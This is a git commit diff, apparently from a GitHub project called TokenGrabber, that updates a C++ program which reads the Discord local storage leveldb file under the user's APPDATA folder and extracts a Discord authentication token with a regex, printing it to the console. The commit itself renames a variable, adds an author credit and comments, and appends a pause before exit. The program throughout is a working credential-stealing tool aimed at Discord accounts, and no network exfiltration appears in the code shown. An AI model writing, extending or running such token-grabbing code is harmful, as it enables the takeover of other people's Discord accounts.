aefbf0765882ec524205788ed444cc2c7c0677e2
xanthe1337 <53409082+xanthe1337@users.noreply.github.com>
2020-03-23 00:46:27 +0100

    Update TokenGrabber.cpp

--- TokenGraber/TokenGrabber.cpp
+++ TokenGraber/TokenGrabber.cpp
@@ -2,16 +2,22 @@
 #include <fstream>
 #include <regex> 
 
-using namespace std;
-    size_t sz = 0;
-    char* szBuf;    
-    errno_t Environment = _dupenv_s(&szBuf, &sz, "APPDATA");
-    string AppData = szBuf;
-    string levelDB = AppData + "/Discord/Local Storage/leveldb/000005.ldb";
-    string Token = "[oken";
-    string Content;
+/*
+  | Made by xanthe1337 
+  | GitHub: https://github.com/xanthe1337
+  | Discord: @xevy#1337
+*/
 
-string readAllText(const char* filename)
+using namespace std;
+   size_t sz = 0;
+   char* szBuf;
+   errno_t Environment = _dupenv_s(&szBuf, &sz, "APPDATA");
+   string AppData = szBuf;
+   string levelDB = AppData + "/Discord/Local Storage/leveldb/000005.ldb"; 
+   string String = "[oken";
+   string Content;
+
+string readAllText(const char* filename) // Shortcut to read every single char in a file
 {
   FILE* fp;
   fopen_s(&fp, filename, "rb");
@@ -22,15 +28,15 @@ string readAllText(const char* filename)
      fread(&Content[0], 1, Content.size(), fp);
      fclose(fp);
      return(Content);
-  } 
+  }
 }
 
-int main()
+int main() // Main function, runs everything using outside functions and variables
 {
     smatch smatch;
     try {
         string data = readAllText(levelDB.c_str());
-        if (data.find(Token, 0) != string::npos) {
+        if (data.find(String, 0) != string::npos) {
            regex x(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
            if (regex_search(data, smatch, x) == true) {
                cout << smatch.str() << '\n';
@@ -42,11 +48,12 @@ int main()
                   cout << "[REGEX] Not Found" << '\n';
                }
            }
-        }
-        else {
+        } else {
             return 0;
         }
     } catch (exception) {
         return 0;
     }
+    system("pause >NUL");
+    cout << "Press any key to exit...";   
 }
